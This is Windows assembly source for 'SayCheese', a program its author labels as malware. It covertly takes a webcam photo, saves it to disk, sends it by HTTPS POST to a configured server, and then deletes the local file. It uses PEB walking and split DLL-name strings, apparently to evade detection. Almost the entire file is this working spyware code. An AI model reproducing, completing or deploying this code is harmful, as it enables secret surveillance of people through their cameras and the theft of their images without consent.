; MIT License
;
; Copyright (c) 2021 4B4DB4B3
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;  ___             ___ _
; / __| __ _ _  _ / __| |_  ___ ___ ___ ___
; \__ \/ _` | || | (__| ' \/ -_) -_|_-</ -_)
; |___/\__,_|\_, |\___|_||_\___\___/__/\___|
;            |__/                           4B4DB4B3
;                                                Malware
;                                                      18.05.21


format PE GUI 4.0
entry start
include 'MACRO/STRUCT.inc'

struct FUNC
        name rb 30
        addr dd ?
ends

MAX_SIZE = 2024

section '.rdata' data readable
        kernel32 dd ?
        GetProcAddress dd ?

        kernelTable:
                FUNC 'LoadLibraryA', 0
                FUNC 'Sleep', 0
                FUNC 'CloseHandle', 0
                FUNC 'CreateFileA', 0
                FUNC 'ReadFile', 0
                FUNC 'DeleteFileA', 0
                FUNC 'ExitProcess', 0
        kernelTable.count = 7

        user32 dd ?
        
        userTable:
                FUNC 'SendMessageA', 0
        userTable.count = 1

        wininet dd ?
        wininetTable:
                FUNC 'InternetOpenA', 0
                FUNC 'InternetConnectA', 0
                FUNC 'HttpOpenRequestA', 0
                FUNC 'HttpSendRequestA', 0
                FUNC 'InternetCloseHandle', 0
                FUNC 'InternetSetOptionA', 0
        wininetTable.count = 6

        avicap dd ?
        avicapTable:
                FUNC 'capCreateCaptureWindowA', 0
        avicapTable.count = 1

        capWin   db '4B4DB4B3', 0

        server   db 'google.com', 0
        accType  db 'application/octet-stream;charset=utf-8', 0
        verb     db 'POST', 0

        _filename  db 'C:\\Users\\cheese.bmp', 0

section '.data' data readable writeable
        hOpen   dd ?
        hCon    dd ?
        hReq    dd ?

        text            rb MAX_SIZE
        bytesReaded     dd ?

        hFile           dd ?

        hWebcam         dd ?

section '.code' code readable executable
        start:  call init
;  ____________________________________________________________
; |                                                            |
; |                    KERNEL32 INIT                           |
; |____________________________________________________________|
                push kernelTable
                push kernelTable.count
                push [kernel32]
                call initFunctions

;  ____________________________________________________________
; |                                                            |
; |                    Load other libraries                    |
; |____________________________________________________________|
                push 0
                push 'll00'
                sub word[esp+0x2], '0'
                push '32.d'
                push 'user'
                push esp
                call [kernelTable+FUNC.addr]
                test eax, eax
                jz exit

                mov [user32], eax

                push 0
                push 'dll0'
                sub word[esp+0x3], '0'
                push 'net.'
                push 'wini'
                push esp
                call [kernelTable+FUNC.addr]

                mov [wininet], eax

                push 0
                push '.dll'
                push 'ap32'
                push 'avic'
                push esp
                call [kernelTable+FUNC.addr]
                test eax, eax
                jz exit

                mov [avicap], eax
;  ____________________________________________________________
; |                                                            |
; |                    Other libaries init                     |
; |____________________________________________________________|
                push userTable
                push userTable.count
                push [user32]
                call initFunctions

                push wininetTable
                push wininetTable.count
                push [wininet]
                call initFunctions

                push avicapTable
                push avicapTable.count
                push [avicap]
                call initFunctions
;  ____________________________________________________________
; |                                                            |
; |                    Main code start                         |
; |                   Get photo from camera                            |
; |____________________________________________________________|

                push 0
                push 0
                push 500
                push 500
                push 10
                push 10
                push 0
                push capWin
                call [avicapTable+FUNC.addr]
                mov [hWebcam], eax

                push 0
                push 0
                push 0x0400 + 10
                push [hWebcam]
                call [userTable+FUNC.addr]

                push 0
                push 0
                push 0x400 + 53
                push [hWebcam]
                call [userTable+FUNC.addr]

                push _filename
                push 0
                push 0x400 + 25
                push [hWebcam]
                call [userTable+FUNC.addr]

                push 0
                push 0
                push 0x400 + 11
                push [hWebcam]
                call [userTable+FUNC.addr]

                push 2000
                call [kernelTable+1*sizeof.FUNC+FUNC.addr]

                push [hWebcam]
                call [kernelTable+2*sizeof.FUNC+FUNC.addr]

                push 0
                push 0
                push 3
                push 0
                push 0x00000001
                push 0x80000000
                push _filename
                call [kernelTable+3*sizeof.FUNC+FUNC.addr]
                mov [hFile], eax
                test eax, eax
                jz exit

                push 0
                push bytesReaded
                push 1024
                push text
                push [hFile]
                call [kernelTable+4*sizeof.FUNC+FUNC.addr]
                cmp eax, 1
                jne exit

;  ____________________________________________________________
; |                                                            |
; |             Sending photo from camera                      |
; |____________________________________________________________|

                push 0
                push 0
                push 42
                push 0
                call [wininetTable+6*sizeof.FUNC+FUNC.addr]

                push 0
                push 0
                push 0
                push 0
                push capWin
                call [wininetTable+FUNC.addr]
                mov [hOpen], eax

                push 0
                push 0
                push 3
                push 0
                push 0
                push 443
                push server
                push [hOpen]
                call [wininetTable+1*sizeof.FUNC+FUNC.addr]
                mov [hCon], eax

                push 0
                push 0x00800000 or 0x80000000
                push accType
                push 0
                push 0
                push 0
                push verb
                push [hCon]
                call [wininetTable+2*sizeof.FUNC+FUNC.addr]
                mov [hReq], eax


                push MAX_SIZE
                push text
                push 0
                push 0
                push [hReq]
                call [wininetTable+3*sizeof.FUNC+FUNC.addr]

        exit:
                push [hOpen]
                call [wininetTable+4*sizeof.FUNC+FUNC.addr]

                push [hCon]
                call [wininetTable+4*sizeof.FUNC+FUNC.addr]

                push [hReq]
                call [wininetTable+4*sizeof.FUNC+FUNC.addr]

                push [hFile]
                call [kernelTable+2*sizeof.FUNC+FUNC.addr]

                push _filename
                call [kernelTable+5*sizeof.FUNC+FUNC.addr]
                push 0
                call [kernelTable+6*sizeof.FUNC+FUNC.addr]
                ret


        initFunctions:
                xor esi, esi
        startInit:
                cmp esi, [esp+8]
                je functionsEndInit

                mov ebx, [esp+12]
                mov edx, esi
                imul edx, sizeof.FUNC
                add ebx, edx

                mov eax, [esp+4]
                push ebx
                push eax
                call [GetProcAddress]

                mov [ebx+FUNC.addr], eax

                inc esi
                jmp startInit

        functionsEndInit:
                ret

        init:
                mov edi, [fs:0x030]
                mov edi, [edi + 0x00c]
                mov edi, [edi + 0x014]
                mov edi, [edi + 0x00]
                mov edi, [edi + 0x00]
                mov edi, [edi + 0x10]

                mov [kernel32], edi

                mov edx, [edi + 0x3c]
                add edx, edi
                mov edx, [edx + 0x78]
                add edx, edi
                mov esi, [edx + 0x20]
                add esi, edi
                xor ecx, ecx

                xor ecx, ecx

        searchProcAddr:
                inc ecx
                lodsd
                add eax, edi
                cmp dword[eax], 'GetP'
                jnz searchProcAddr
                cmp dword[eax + 0x4], 'rocA'
                jnz searchProcAddr
                cmp dword[eax + 0x8], 'ddre'
                jnz searchProcAddr


                mov esi, [edx + 0x24]
                add esi, edi
                mov cx, [esi + ecx * 2]
                dec ecx
                mov esi, [edx + 0x1c]
                add esi, edi
                mov edx, [esi + ecx * 4]
                add edx, edi
                mov [GetProcAddress], edx

                ret